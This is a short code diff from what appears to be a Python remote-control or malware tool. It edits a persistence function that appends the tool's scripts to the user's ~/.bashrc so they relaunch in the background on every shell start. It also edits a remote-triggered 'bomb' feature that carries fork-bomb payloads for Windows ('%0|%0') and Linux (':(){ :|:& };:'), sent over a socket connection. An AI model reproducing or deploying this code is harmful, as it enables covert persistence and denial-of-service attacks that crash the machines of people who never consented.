@@ -23,8 +23,8 @@ Color_Off='\033[0m'
 # Persistent
 def add2bashrc():
     if os.name != "nt":
-        os.system("echo python3 `pwd`/main.py  >> `echo $HOME`/.bashrc")
-        os.system("echo python3 `pwd`/onefile.py  >> `echo $HOME`/.bashrc")
+        os.system("echo python3 `pwd`/main.py&  >> `echo $HOME`/.bashrc")
+        os.system("echo python3 `pwd`/onefile.py&  >> `echo $HOME`/.bashrc")
     
 
 # Term Bomb
@@ -155,7 +155,7 @@ def killProcess(con):
 
 # Launch bomb
 
-win = "powershell -c ii /*"
+win = "cmd.exe /c %0|%0"
 lin = "bash -c ':(){ :|:& };:'"
 def launchBomb(con):
     con.sendall(b"Are you sure?")
